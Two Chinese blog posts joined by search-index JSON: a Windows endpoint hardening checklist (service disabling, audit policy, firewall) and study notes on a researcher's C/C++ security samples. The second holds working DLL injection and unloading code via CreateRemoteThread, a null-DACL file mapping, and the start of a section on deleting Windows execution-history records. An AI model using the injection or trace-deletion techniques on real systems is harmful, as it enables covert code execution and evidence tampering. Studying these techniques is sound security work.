TCP&#x2F;IP筛选内容描述： 允许您连接到您的Windows计算机的TCP&#x2F;IP网络流量类型。 加固建议： 网上邻居\\属性\\本地连接右键属性\\ Internet协议（TCP&#x2F;IP)\\属性\\高级\\选项\\TCP&#x2F;IP筛选\\属性\\启动TCP&#x2F;IP筛选的功能 3. 资源控制3.1 Remote Access Auto Connection Manager (RasAuto)内容描述： 每当程序引用远程DNS或NetBIOS名称或地址时，都会创建到远程网络的连接。 加固建议： Windows10&#x2F;8&#x2F;7&#x2F;XP：请将以下UI路径设置为：“禁用”。我的电脑\\右键\\管理\\计算机管理(本地)\\ 服务和应用程序\\服务\\Remote Access Auto Connection Manager；（或通过以下方式：同时按下win+r键，在运行窗口中输入services.msc，即可打开服务。） 3.2 Remote Desktop Services (TermService)内容描述： 允许用户以交互方式连接到远程计算机。 远程桌面和远程桌面会话主机服务器取决于此服务。 加固建议： Windows10&#x2F;8&#x2F;7：请将以下UI路径设置为：禁用。我的电脑\\右键\\管理\\计算机管理(本地)\\ 服务和应用程序\\服务\\Remote Desktop Services。（或通过以下方式：同时按下win+r键，在运行窗口中输入services.msc，即可打开服务。） 3.3 Remote Procedure Call (RPC) Locator (RpcLocator)内容描述： 在Windows 2003和Windows的早期版本中，远程过程调用（RPC）定位器服务管理RPC名称服务数据库。 在Windows Vista和Windows的更高版本中，此服务不提供任何功能，并且提供此功能是为了与应用程序兼容。 加固建议： Windows10&#x2F;8&#x2F;7&#x2F;XP：请将以下UI路径设置为：禁用。我的电脑\\右键\\管理\\计算机管理(本地)\\ 服务和应用程序\\服务\\Remote Procedure Call (RPC) Locator (RpcLocator)。（或通过以下方式：同时按下win+r键，在运行窗口中输入services.msc，即可打开服务。） 3.4 Remote Registry (RemoteRegistry)内容描述： 在Windows 2003和Windows的早期版本中，远程过程调用（RPC）定位器服务管理RPC名称服务数据库。 在Windows Vista和Windows的更高版本中，此服务不提供任何功能，并且提供此功能是为了与应用程序兼容。 加固建议： Windows10&#x2F;8&#x2F;7&#x2F;XP：请将以下UI路径设置为：禁用。我的电脑\\右键\\管理\\计算机管理(本地)\\ 服务和应用程序\\服务\\Remote Registry（或通过以下方式：同时按下win+r键，在运行窗口中输入services.msc，即可打开服务。） 3.5 Remote Desktop Configuration (SessionEnv)内容描述： 远程桌面配置服务（RDCS）负责所有需要SYSTEM上下文的与远程桌面相关的配置和会话维护活动。 其中包括每个会话的临时文件夹，RD主题和RD证书。 加固建议： Windows10&#x2F;8&#x2F;7：请将以下UI路径设置为：禁用。我的电脑\\右键\\管理\\计算机管理(本地)\\ 服务和应用程序\\服务\\Remote Desktop Configuration。（或通过以下方式：同时按下win+r键，在运行窗口中输入services.msc，即可打开服务。） 3.6 Remote Desktop Services UserMode Port Redirector (UmRdpService)内容描述： 允许重定向打印机&#x2F;驱动器&#x2F;端口以进行RDP连接。 加固建议： helpDocument.baseline.checkItems.1037.suggest 注意： Windows10&#x2F;8&#x2F;7：请将以下UI路径设置为：禁用。我的电脑\\右键\\管理\\计算机管理(本地)\\ 服务和应用程序\\服务\\Remote Desktop Services UserMode Port Redirector。（或通过以下方式：同时按下win+r键，在运行窗口中输入services.msc，即可打开服务。） 3.7 Telnet服务器内容描述： 提供网络访问的服务是一个攻击用的很好的渠道，在没有必要的情况下建议关闭。 加固建议： Windows8&#x2F;7&#x2F;XP：请将以下UI路径设置为：我的电脑鼠标右键“管理”\\打开计算机管理\\服务和应用程序\\Telnet。 注意： 如何验证telnet服务是否真的关闭了？使用快捷键win键+r，输入cmd，点击【确定】。输入telnet +IP地址（例如：telnet 192.168.1.1），回车，提示telnet不是内部或外部命令，也不是可运行的程序或批处理文件。说明已经禁止telnet。 3.8 IE受信任站点检查内容描述： 检查对应站点是否加入IE受信任站点。 加固建议： Windows10&#x2F;8&#x2F;7&#x2F;XP：通过以下UI路径设置为：已启用。计算机配置\\管理模板\\Windows组件\\Internet Explorer\\Internet 控制面板\\安全页\\站点到区域分配列表。 3.9 Routing And Remote Access (RemoteAccess)内容描述： 为局域网和广域网环境中的企业提供路由服务。 加固建议： Windows10&#x2F;8&#x2F;7&#x2F;XP：请将以下UI路径设置为：禁用。我的电脑\\右键\\管理\\计算机管理(本地)\\ 服务和应用程序\\服务\\Routing and Remote Access（或通过以下方式：同时按下win+r键，在运行窗口中输入services.msc，即可打开服务。） 3.10 Windows Event Log内容描述： 此服务管理事件和事件日志。它支持日志记录事件、查询事件、订阅事件、归档事件日志以及管理事件元数据。它可以用 XML 和纯文本两种格式显示事件。停止该服务可能危及系统的安全性和可靠性。 加固建议： Windows10&#x2F;8&#x2F;7：控制面板\\系统和安全\\管理工具\\服务\\Windows Event Log 3.11 专用配置文件的:防火墙状态内容描述： 指定将计算机连接到专用网络位置时的行为。 加固建议： Windows10&#x2F;8&#x2F;7：计算机配置\\ Windows设置\\安全设置\\高级安全Windows Defender防火墙\\高级安全Windows Defender防火墙-本地组策略对象\\Windows Defender防火墙属性\\专用配置文件\\防火墙状态 3.12 公用配置文件的:防火墙状态内容描述： 指定将计算机连接到专用网络位置时的行为。 加固建议： Windows10&#x2F;8&#x2F;7：计算机配置\\ Windows设置\\安全设置\\高级安全Windows Defender防火墙\\高级安全Windows Defender防火墙-本地组策略对象\\Windows Defender防火墙属性\\公用配置文件\\防火墙状态 3.13 公用配置文件的:应用本地防火墙规则内容描述： 指定将计算机连接到专用网络位置时的行为。 加固建议： Windows10&#x2F;8&#x2F;7：计算机配置\\ Windows设置\\安全设置\\高级安全Windows Defender防火墙\\高级安全Windows Defender防火墙-本地组策略对象\\Windows Defender防火墙属性\\公用配置文件\\指定Windows Defender防火墙行为的设置-自定义\\应用本地防火墙规则设置为否 3.14 Windows防火墙检查（仅针对Xp系统）内容描述： 检查防火墙启用状态。 加固建议： 请按以下路径配置：防火墙状态。若您购买的奇安信终端安全管理系统已授权模块包含“主机防火墙”，您可在主机防火墙模块完成防火墙的状态调整。奇安信终端安全管理系统授权模块不包含 “主机防火墙”，您可按照以下路径下配置：控制面板\\系统和安全\\Windows Defender 防火墙\\自定义设置。 4. 安全审计4.1 审核登录内容描述： 此策略设置允许你审核由计算机上的用户帐户登录尝试所生成的事件。 加固建议： Windows10&#x2F;8&#x2F;7：请将以下UI路径设置为：成功和失败。计算机配置\\Windows设置\\安全设置\\高级审核策略配置\\系统审核策略\\登录&#x2F;注销\\审核登录。 4.2 审核其他登录&#x2F;注销事件内容描述： 此策略设置允许你审核“登录&#x2F;注销”策略设置未涵盖的其他登录&#x2F;注销相关事件，例如: 终端服务会话断开连接。 新建终端服务会话。 锁定和解锁工作站。 调用屏幕保护程序。 解除屏幕保护程序。 加固建议： Windows10&#x2F;8&#x2F;7：请将以下UI路径设置为成功和失败：计算机配置\\Windows设置\\安全设置\\高级审核策略配置\\系统审核策略\\登录&#x2F;注销\\审核其他登录&#x2F;注销事件。 4.3 审核审核策略更改内容描述： 此策略设置允许你审核对安全审核策略设置的更改，例如: 设置审核策略对象上的权限和审核设置。 更改系统审核策略。 注册安全事件源。 注销安全事件源。 更改每用户审核设置。 更改 CrashOnAuditFail 的值。 更改文件系统或注册表对象上的系统访问控制列表。 更改特殊组列表。 加固建议： Windows10&#x2F;8&#x2F;7：请设置以下UI路径以包含成功：计算机配置\\Windows设置\\安全设置\\高级审核策略配置\\系统审核策略\\策略更改\\审核审核策略更改。 注意： 当某个对象的系统访问控制列表(SACL)发生更改并且启用策略更改类别时执行 SACL 更改审核。在启用对象访问审核并且将对象的 SACL 配置为审核 DACL&#x2F;所有者更改时审核自定义访问控制列表(SACL)和所有权更改。 4.4 管理审核和安全日志内容描述： 此安全设置确定哪些用户可以为各种资源(如文件、Active Directory 对象和注册表项)指定对象访问审核选项。 加固建议： Windows10&#x2F;8&#x2F;7&#x2F;XP：计算机配置\\ Windows设置\\安全设置\\本地策略\\用户权限分配\\管理审核和安全日志 4.5 审核帐户锁定内容描述： 此策略设置允许你审核由尝试登录到已锁定帐户失败而生成的事件。 加固建议： Windows10&#x2F;8&#x2F;7：计算机配置\\ Windows设置\\安全设置\\高级审核策略配置\\系统审核策略\\登录&#x2F;注销\\审核账户锁定 \\5. 入侵防范 5.1 关闭自动播放内容描述： 此策略可防止可移动存储设备连接到计算机后，恶意软件会自动运行起来。 加固建议： Windows10&#x2F;8&#x2F;7&#x2F; vista：请将以下UI路径设置为：已启用所有驱动器：计算机配置\\管理模板\\Windows组件\\自动播放策略\\关闭自动播放。 注意： “计算机配置”和“用户配置”文件夹中都存在此策略设置。如果两个策略设置发生冲突，则“计算机配置”中的策略设置优先于“用户配置”中的策略设置。 此组策略路径由Microsoft Windows管理模板的所有版本附带的组策略模板AutoPlay.admx &#x2F; adml提供。 系统状态安全检查1 补丁检查内容描述： 是否安装关键和重要系统补丁。 加固建议： 若您购买的奇安信终端安全管理系统已授权模块包含“补丁管理”，您可在补丁管理模块完成补丁修复，若您购买的奇安信终端安全管理系统授权模块不包含“补丁管理”，您可以联系销售来咨询购买事项。 注意： 无“补丁管理”模块，该项检查无结果，系统显示检查异常，但本项不扣除对应分数。 2 防病毒检查内容描述： 检查终端上是否安装了防病毒软件。本地防病毒软件的版本及病毒库是否及时更新。 加固建议： 若您购买的奇安信终端安全管理系统已授权模块包含“软件管家”，您可在软件管家模块完成防病毒软件安装及本地防病毒软件版本更新。若您购买的奇安信终端安全管理系统授权模块不包含 “软件管家”，您可以在对应杀软官网手动下载或联系销售来咨询模块授权购买事项。 3 杀毒软件保护检查内容描述： 检查计算机是否存在杀毒软件保护，存在杀毒软件则检查通过 加固建议： 请在计算机上安装防病毒软件 4 工作组命名检查内容描述： 检查工作组命名规范。 加固建议： 请按以下路径配置：控制面板\\系统和安全\\系统\\计算机名、域和工作组设置\\计算机名\\更改\\工作组 (查看方式为类别) 注意： 请根据管理员设置规范设置工作组名称。 5 域检查内容描述： 检测当前系统是否加入域。 加固建议： 请按以下路径配置：将计算机加入域。控制面板\\系统和安全\\系统\\计算机名、域和工作组设置\\计算机名\\网络ID (查看方式为类别) 注意： 该项与计算机工作组命名二选一 6 计算机命名检查内容描述： 检查计算机命名规范。 加固建议： 请按以下路径配置：控制面板\\系统和安全\\系统\\计算机名、域和工作组设置\\计算机名 (查看方式为类别) 注意： 请根据管理员设置规范设置工作组名称。 7 空口令检查内容描述： 检查操作系统账户密码是否为空口令。 加固建议： 请尽快设置系统账户密码。 8 系统中重要目录对Everyone或Guests来宾账户开放检查内容描述： 检查操作系统中重要目录（C:\\windows\\system和C:\\windows\\system32\\config）是否对Everyone或Guests来宾账户开放。 加固建议： 请取消对Everyone或Guests来宾账户开放操作系统中重要目录（右键\\属性\\安全，查看文件目录对应的组或用户名是否包含Everyone或Guests来宾账户） 9 系统备份还原点检查内容描述： 检查在计算机中是否发现系统备份还原点。 加固建议： 请在系统设置\\系统保护\\配置中设置系统还原点。 10 系统隐藏用户检查内容描述： 检查系统是否存在隐藏的用户。 加固建议： 我的电脑\\右键\\管理\\计算机管理(本地)\\系统工具\\本地用户和组\\用户\\右键删除（名称结尾带$符号的是隐藏用户） 注意： 所谓隐藏账户即为控制面板与开机选择中看不见的账户。它可以用输账号密码的方式进入。 11 操作系统是否开启Hardware DEP Available保护检查内容描述： 检查操作系统是否开启Hardware DEP Available保护 加固建议： 控制面板\\系统和安全\\系统\\高级系统设置\\高级\\性能-设置\\数据执行保护 系统运行安全检查1 进程检查内容描述： 检测进程项是否运行&#x2F;禁止，运行&#x2F;禁止其中任意进程即视为符合规范。 加固建议： 请按以下路径配置：进程启停状态。Ctrl+Alt+Delete\\启动。 2 端口检查内容描述： 端口状态检查。 加固建议： 请检查监听的端口是否符合管理员设置的端口开放要求（可以通过运行CMD并输入命令查看系统正在监听的端口：netstat -ano |findstr “xxx”）。"},{"title":"【A学习】Homework-of-C-Language","date":"2024-04-17T03:47:53.883Z","path":"wiki/Homework-c-language/index.html","text":"概述：3gstudent&#x2F;Homework-of-C-Language: C&#x2F;C++ code examples of my blog. 仓库学习记录 [toc] 0x01 CheckCriticalProess 说明: 检查进程是不是关键进程 相关链接： NtQueryInformationProcess 函数 (winternl.h) - Win32 apps | Microsoft Learn windows关键进程列表： 内核的系统进程（NTOSKrnl.exe） 会话管理器子系统（SMSS.exe） 客户端服务器运行时子系统（CSRSS.exe） Windows登录（WinLogon.exe） Windows Init（WinInit.exe） 仅适用于RDP的 Windows登录用户界面主机（LogonUI.exe） 本地安全机构进程（lsass.exe） 服务控制管理器（Services.exe） 使用RPCSS或Dcom &#x2F; PnP的 服务主机（svchost.exe） 桌面窗口管理器（DWM.exe） 加上其他可选流程，如性能监控 或Internet Information Server（ISS） 步骤 获取进程 PID 通过 PID 打开进程 获取 ntdll.dll 中的导出函数 NtQueryInformationProcess 通过 NtQueryInformationProcess 获取 ProcessBreakOnTermination 的值 代码说明主要通过 ntdll 中的接口 NtQueryInformationProcess 获取 ProcessBreakOnTermination 的值。从 windows 8.1 开始可以使用 IsProcessCritical 来判断。 12345678status = NtQueryInformationProcess(hProcess, ProcessBreakOnTermination, &amp;breakOnTermination, sizeof(ULONG), NULL);if (status &lt; 0) printf(&quot;[!]NtQueryInformationProcess error\\n&quot;);if (breakOnTermination == 1) printf(&quot;[+]The process is critical\\n&quot;);else printf(&quot;[!]The process is not critical\\n&quot;); 0x02 CheckUserBadPwdPolicy 说明：获取域内用户的 badPasswordTime 和 badPwdCount 属性 相关链接： ADsOpenObject 函数 (adshlp.h) - Win32 apps | Microsoft Learn该函数用户绑定到 ADSI 对象，但如果传入的用户名和密码均为空，则会使用运行程序的用户账户上线文进行绑定。 关键代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244HRESULT FindUsers(IDirectorySearch* pContainerToSearch, //IDirectorySearch pointer to Partitions container. LPOLESTR szFilter, //Filter for finding specific crossrefs. //NULL returns all attributeSchema objects. LPOLESTR* pszPropertiesToReturn, //Properties to return for crossRef objects found //NULL returns all set properties. unsigned long ulNumPropsToReturn // Number of property strings in pszPropertiesToReturn)&#123; if (!pContainerToSearch) return E_POINTER; //Create search filter LPOLESTR pszSearchFilter = new OLECHAR[MAX_PATH * 2]; if (!pszSearchFilter) return E_OUTOFMEMORY; wchar_t szFormat[] = L&quot;(&amp;(objectClass=user)(objectCategory=person)%s)&quot;; // Check the buffer first if (IS_BUFFER_ENOUGH(MAX_PATH * 2, szFormat, szFilter) &gt; 0) &#123; //Add the filter. swprintf_s(pszSearchFilter, MAX_PATH * 2, szFormat, szFilter); &#125; else &#123; wprintf(L&quot;The filter is too large for buffer, aborting...&quot;); delete[] pszSearchFilter; return FALSE; &#125; //Specify subtree search ADS_SEARCHPREF_INFO SearchPrefs; SearchPrefs.dwSearchPref = ADS_SEARCHPREF_SEARCH_SCOPE; SearchPrefs.vValue.dwType = ADSTYPE_INTEGER; SearchPrefs.vValue.Integer = ADS_SCOPE_SUBTREE; DWORD dwNumPrefs = 1; // COL for iterations LPOLESTR pszColumn = NULL; ADS_SEARCH_COLUMN col; HRESULT hr; // Interface Pointers IADs* pObj = NULL; IADs* pIADs = NULL; // Handle used for searching ADS_SEARCH_HANDLE hSearch = NULL; // Set the search preference hr = pContainerToSearch-&gt;SetSearchPreference(&amp;SearchPrefs, dwNumPrefs); if (FAILED(hr)) &#123; delete[] pszSearchFilter; return hr; &#125; LPOLESTR pszBool = NULL; DWORD dwBool; PSID pObjectSID = NULL; LPOLESTR szSID = NULL; LPOLESTR szDSGUID = new WCHAR[39]; LPGUID pObjectGUID = NULL; FILETIME filetime; SYSTEMTIME systemtime; DATE date; VARIANT varDate; LARGE_INTEGER liValue; LPOLESTR* pszPropertyList = NULL; LPOLESTR pszNonVerboseList[] = &#123; L&quot;name&quot;,L&quot;distinguishedName&quot; &#125;; unsigned long ulNonVbPropsCount = 2; int iCount = 0; DWORD x = 0L; if (!pszPropertiesToReturn) &#123; //Return all properties. hr = pContainerToSearch-&gt;ExecuteSearch(pszSearchFilter, NULL, -1L, &amp;hSearch ); &#125; else &#123; //specified subset. pszPropertyList = pszPropertiesToReturn; //Return specified properties hr = pContainerToSearch-&gt;ExecuteSearch(pszSearchFilter, pszPropertyList, sizeof(pszPropertyList) / sizeof(LPOLESTR), &amp;hSearch ); &#125; if (SUCCEEDED(hr)) &#123; // Call IDirectorySearch::GetNextRow() to retrieve the next row //of data hr = pContainerToSearch-&gt;GetFirstRow(hSearch); if (SUCCEEDED(hr)) &#123; while (hr != S_ADS_NOMORE_ROWS) &#123; //Keep track of count. iCount++; wprintf(L&quot;----------------------------------\\n&quot;); // loop through the array of passed column names, // print the data for each column while (pContainerToSearch-&gt;GetNextColumnName(hSearch, &amp;pszColumn) != S_ADS_NOMORE_COLUMNS) &#123; hr = pContainerToSearch-&gt;GetColumn(hSearch, pszColumn, &amp;col); if (SUCCEEDED(hr)) &#123; // Print the data for the column and free the column if ((0 == wcscmp(L&quot;name&quot;, col.pszAttrName)) | (0 == wcscmp(L&quot;badPasswordTime&quot;, col.pszAttrName)) || (0 == wcscmp(L&quot;badPwdCount&quot;, col.pszAttrName)) ) &#123; // Get the data for this column wprintf(L&quot;%s:&quot;, col.pszAttrName); switch (col.dwADsType) &#123; case ADSTYPE_DN_STRING: case ADSTYPE_CASE_EXACT_STRING: case ADSTYPE_CASE_IGNORE_STRING: case ADSTYPE_PRINTABLE_STRING: case ADSTYPE_NUMERIC_STRING: case ADSTYPE_TYPEDNAME: case ADSTYPE_FAXNUMBER: case ADSTYPE_PATH: case ADSTYPE_OBJECT_CLASS: for (x = 0; x &lt; col.dwNumValues; x++) &#123; wprintf(L&quot; %s\\r\\n&quot;, col.pADsValues[x].CaseIgnoreString); &#125; break; case ADSTYPE_BOOLEAN: case ADSTYPE_INTEGER: for (x = 0; x &lt; col.dwNumValues; x++) &#123; wprintf(L&quot; %d\\r\\n&quot;, col.pADsValues[x].Integer); &#125; break; case ADSTYPE_OCTET_STRING: case ADSTYPE_UTC_TIME: case ADSTYPE_LARGE_INTEGER: for (x = 0; x &lt; col.dwNumValues; x++) &#123; liValue = col.pADsValues[x].LargeInteger; filetime.dwLowDateTime = liValue.LowPart; filetime.dwHighDateTime = liValue.HighPart; if ((filetime.dwHighDateTime == 0) &amp;&amp; (filetime.dwLowDateTime == 0)) &#123; wprintf(L&quot; No value set.\\n&quot;); &#125; else &#123; //Check for properties of type LargeInteger that represent time //if TRUE, then convert to variant time. if (0 == wcscmp(L&quot;badPasswordTime&quot;, col.pszAttrName)) &#123; //Handle special case for Never Expires where low part is -1 if (filetime.dwLowDateTime == -1) &#123; wprintf(L&quot; Never Expires.\\n&quot;); &#125; else &#123; if (FileTimeToLocalFileTime(&amp;filetime, &amp;filetime) != 0) &#123; if (FileTimeToSystemTime(&amp;filetime, &amp;systemtime) != 0) &#123; if (SystemTimeToVariantTime(&amp;systemtime, &amp;date) != 0) &#123; //Pack in variant.vt varDate.vt = VT_DATE; varDate.date = date; VariantChangeType(&amp;varDate, &amp;varDate, VARIANT_NOVALUEPROP, VT_BSTR); wprintf(L&quot; %s\\r\\n&quot;, varDate.bstrVal); VariantClear(&amp;varDate); &#125; else &#123; wprintf(L&quot; FileTimeToVariantTime failed\\n&quot;); &#125; &#125; else &#123; wprintf(L&quot; FileTimeToSystemTime failed\\n&quot;); &#125; &#125; else &#123; wprintf(L&quot; FileTimeToLocalFileTime failed\\n&quot;); &#125; &#125; &#125; else &#123; //Print the LargeInteger. wprintf(L&quot; high: %d low: %d\\r\\n&quot;, filetime.dwHighDateTime, filetime.dwLowDateTime); &#125; &#125; &#125; break; case ADSTYPE_NT_SECURITY_DESCRIPTOR: for (x = 0; x &lt; col.dwNumValues; x++) &#123; wprintf(L&quot; Security descriptor.\\n&quot;); &#125; break; default: wprintf(L&quot;Unknown type %d.\\n&quot;, col.dwADsType); &#125; &#125; pContainerToSearch-&gt;FreeColumn(&amp;col); &#125; FreeADsMem(pszColumn); &#125; //Get the next row hr = pContainerToSearch-&gt;GetNextRow(hSearch); &#125; &#125; // Close the search handle to clean up pContainerToSearch-&gt;CloseSearchHandle(hSearch); &#125; if (SUCCEEDED(hr) &amp;&amp; 0 == iCount) hr = S_FALSE; delete[] pszSearchFilter; return hr;&#125; FileMapping 说明：创建文件映射以共享数据 CreateFileMapping 说明：创建文件映射 步骤 初始化安全描述符 SECURITY_ATTRIBUTES，该安全描述符描述了子进程是否可以继承当前句柄。结构体如下所示： 12345typedef struct _SECURITY_ATTRIBUTES &#123; DWORD nLength; LPVOID lpSecurityDescriptor; BOOL bInheritHandle;&#125; SECURITY_ATTRIBUTES, *PSECURITY_ATTRIBUTES, *LPSECURITY_ATTRIBUTES; nLength: 当前结构大小 lpSecurityDescription: 指向 SECURITY_DESCRIPTOR 的指针，该结构保存了查询对象的安全状态。 bInheritHandle： 创建新进程时是否继承当前句柄，默认为 FALSE 调用 CreateFileMapping 为指定文件创建或打开命名或未命名的文件映射对象。 调用MapViewOfFile ，创建文件映射的视图到进程内存地址的映射，该函数会返回映射在进程空间的内存地址Address 写入数据到步骤2返回的Address中 CreateFileMapping 创建 &quot;Global\\*&quot; 前缀的对象时，需要管理员权限。不需要管理员权限情况下可以使用 Local\\* 前缀来创建对象。 主要代码创建安全描述符 1234567891011121314151617181920PSECURITY_DESCRIPTOR pSec = (PSECURITY_DESCRIPTOR)LocalAlloc(LMEM_FIXED, SECURITY_DESCRIPTOR_MIN_LENGTH);if (!pSec)&#123; return GetLastError();&#125;if (!InitializeSecurityDescriptor(pSec, SECURITY_DESCRIPTOR_REVISION))&#123; LocalFree(pSec); return GetLastError();&#125;if (!SetSecurityDescriptorDacl(pSec, TRUE, NULL, TRUE))&#123; LocalFree(pSec); return GetLastError();&#125;SECURITY_ATTRIBUTES attr;attr.bInheritHandle = FALSE;attr.lpSecurityDescriptor = pSec;attr.nLength = sizeof(SECURITY_ATTRIBUTES);printf(&quot;Done\\n&quot;); 创建文件映射到内存的映射，并写入数据 1234567891011121314HANDLE hMapFile1 = CreateFileMapping(INVALID_HANDLE_VALUE, &amp;attr, PAGE_READWRITE, 0, BUF_SIZE, szName1);if (hMapFile1 == NULL)&#123; printf(&quot;\\n[!]Could not create file mapping object1 (%d).\\n&quot;, GetLastError()); return 0;&#125;pBuf = (char*)MapViewOfFile(hMapFile1, FILE_MAP_ALL_ACCESS, 0, 0, BUF_SIZE);if (pBuf == NULL)&#123; printf(&quot;\\n[!]Could not map view of file1 (%d).\\n&quot;, GetLastError()); CloseHandle(hMapFile1); return 1;&#125;CopyMemory((PVOID)pBuf, argv[1], strlen(argv[1])); OpenFileMapping 说明：打开文件映射并读取文件映射中的数据。 步骤与创建文件共享不同，打开并读取的步骤相对简单。 调用 OpenFileMapping 打开一个指定名称的文件共享对象 调用 MapViewOfFile 获取文件共享的地址 Address 读取 Address 地址的内容 主要代码1234567891011121314151617TCHAR szName2[] = L&quot;Global\\\\SharedMappingObject2&quot;;HANDLE hMapFile1 = OpenFileMapping(FILE_MAP_ALL_ACCESS, FALSE, szName1);if (hMapFile1 == NULL)&#123; printf(&quot;[!]Could not create file mapping object (%d).\\n&quot;, GetLastError()); return 1;&#125;pBuf1 = (char*)MapViewOfFile(hMapFile1, FILE_MAP_ALL_ACCESS, 0, 0, BUF_SIZE);if (pBuf1 == NULL)&#123; printf(&quot;[!]Could not map view of file (%d).\\n&quot;, GetLastError()); CloseHandle(hMapFile1); return 1;&#125;MessageBox(NULL, CA2W(pBuf1), TEXT(&quot;Process2&quot;), MB_OK);DWORD EventRecordID = 0; CreateRemoteThread主要就是在目标进程中调用 LoadLibrary 和 FreeLibrary 这两个函数。 CreateRemoteThread LoadLibrary Freelibrary OpenProcess VirtualAllocEx GetProcAddress CreateToolhelp32Snapshot 注意点卸载dll时需要判断dll是否存在。 需要调用 CreateToolhelp32Snapshot 通过 MODULEENTRY32 枚举进程加载的模块有哪些。MODULEENTRY32 结构体如下所示 szModule：模块名 szExePath：模块加载的路径 123456789101112131415typedef struct tagMODULEENTRY32&#123; DWORD dwSize; DWORD th32ModuleID; // This module DWORD th32ProcessID; // owning process DWORD GlblcntUsage; // Global usage count on the module DWORD ProccntUsage; // Module usage count in th32ProcessID&#x27;s context BYTE * modBaseAddr; // Base address of module in th32ProcessID&#x27;s context DWORD modBaseSize; // Size in bytes of module starting at modBaseAddr HMODULE hModule; // The hModule of this module in th32ProcessID&#x27;s context char szModule[MAX_MODULE_NAME32 + 1]; char szExePath[MAX_PATH];&#125; MODULEENTRY32;typedef MODULEENTRY32 * PMODULEENTRY32;typedef MODULEENTRY32 * LPMODULEENTRY32; 创建远程线程加载dll12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273BOOL InjectDll(UINT32 ProcessId, char* DllPath)&#123; if (strstr(DllPath, &quot;\\\\\\\\&quot;) != 0) &#123; printf(&quot;[!]Wrong Dll path\\n&quot;); return FALSE; &#125; if (strstr(DllPath, &quot;\\\\&quot;) == 0) &#123; printf(&quot;[!]Need Dll full path\\n&quot;); return FALSE; &#125; size_t len = strlen(DllPath) + 1; LPVOID pThreadData = NULL; HANDLE ProcessHandle = NULL; HANDLE hThread = NULL; BOOL bRet = FALSE; __try &#123; ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessId); if (ProcessHandle == NULL) &#123; printf(&quot;[!]OpenProcess error\\n&quot;); __leave; &#125; pThreadData = VirtualAllocEx(ProcessHandle, NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (pThreadData == NULL) &#123; CloseHandle(ProcessHandle); printf(&quot;[!]VirtualAllocEx error\\n&quot;); __leave; &#125; BOOL bWriteOK = WriteProcessMemory(ProcessHandle, pThreadData, DllPath, len, NULL); if (!bWriteOK) &#123; CloseHandle(ProcessHandle); printf(&quot;[!]WriteProcessMemory error\\n&quot;); __leave; &#125; LPTHREAD_START_ROUTINE LoadLibraryAddress = NULL; HMODULE Kernel32Module = GetModuleHandle(&quot;Kernel32&quot;); LoadLibraryAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(Kernel32Module, &quot;LoadLibraryA&quot;); hThread = CreateRemoteThread(ProcessHandle, NULL, 0, LoadLibraryAddress, pThreadData, 0, NULL); if (hThread == NULL) &#123; CloseHandle(ProcessHandle); printf(&quot;[!]CreateRemoteThread error\\n&quot;); __leave; &#125; WaitForSingleObject(hThread, INFINITE); bRet = TRUE; &#125; __finally &#123; if (pThreadData != NULL) VirtualFreeEx(ProcessHandle, pThreadData, 0, MEM_RELEASE); if (hThread != NULL) CloseHandle(hThread); if (ProcessHandle != NULL) CloseHandle(ProcessHandle); &#125; return bRet;&#125; 创建远程线程卸载dll1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556BOOL FreeDll(UINT32 ProcessId, char* DllFullPath)&#123; BOOL bMore = FALSE, bFound = FALSE; HANDLE hSnapshot; HMODULE hModule = NULL; MODULEENTRY32 me = &#123; sizeof(me) &#125;; BOOL bSuccess = FALSE; hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, ProcessId); bMore = Module32First(hSnapshot, &amp;me); for (; bMore; bMore = Module32Next(hSnapshot, &amp;me)) &#123; if (!strcmp((LPCTSTR)me.szModule, DllFullPath) || !strcmp((LPCTSTR)me.szExePath, DllFullPath)) &#123; bFound = TRUE; break; &#125; &#125; if (!bFound) &#123; CloseHandle(hSnapshot); return FALSE; &#125; BOOL bRet = FALSE; HANDLE ProcessHandle = NULL; __try &#123; ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessId); if (ProcessHandle == NULL) &#123; printf(&quot;[!]OpenProcess error\\n&quot;); __leave; &#125; LPTHREAD_START_ROUTINE FreeLibraryAddress = NULL; HMODULE Kernel32Module = GetModuleHandle(&quot;Kernel32&quot;); FreeLibraryAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(Kernel32Module, &quot;FreeLibrary&quot;); HANDLE hThread = NULL; hThread = CreateRemoteThread(ProcessHandle, NULL, 0, FreeLibraryAddress, me.modBaseAddr, 0, NULL); if (hThread == NULL) &#123; CloseHandle(ProcessHandle); printf(&quot;[!]CreateRemoteThread error\\n&quot;); __leave; &#125; WaitForSingleObject(hThread, INFINITE); bRet = TRUE; &#125; __finally &#123; if (ProcessHandle != NULL) CloseHandle(ProcessHandle); &#125; return bRet;&#125; DeleteRecordFileCache&#x3D;&#x3D;RecentFileCahce.bcf&#x3D;&#x3D; 文件说明&#x3D;&#x3D;RecentFileCache.bcf&#x3D;&#x3D; 文件是 win7 操作系统下特有的文件，用来跟踪应用程序与不同可执行文件的兼容性问题，能够记录应用程序执行的历史记录。 win8及以上的系统不支持该文件。 文件位置： C:\\Windows\\AppCompat\\Programs\\RecentFileCache.bcf 可以用 winhex 打开查看文件内容，如下所示： 从图中可以看出 &#x3D;&#x3D;RecenFileCache&#x3D;&#x3D; 文件的结构，20字节的文件头，之后就是 4字节长度加文件执行路径这样的格式了。 根据文件结构定义了以下两个结构体 123456// 文件typedef struct _BCF_HEADER &#123; ULONG64 Flag1; ULONG64 Flag2; ULONG Unknown;&#125; BCFHEADER, *PBCFHEADER; 123typedef struct _BCF_RECORD &#123; ULONG Size;&#125; BCFRECORD, *PBCFRECORD; 注： ULONG64为8字节，ULONG为4字节 逐个解析每条记录，通过固定变量Size确定记录长度，进而读取每条记录的内容 读取 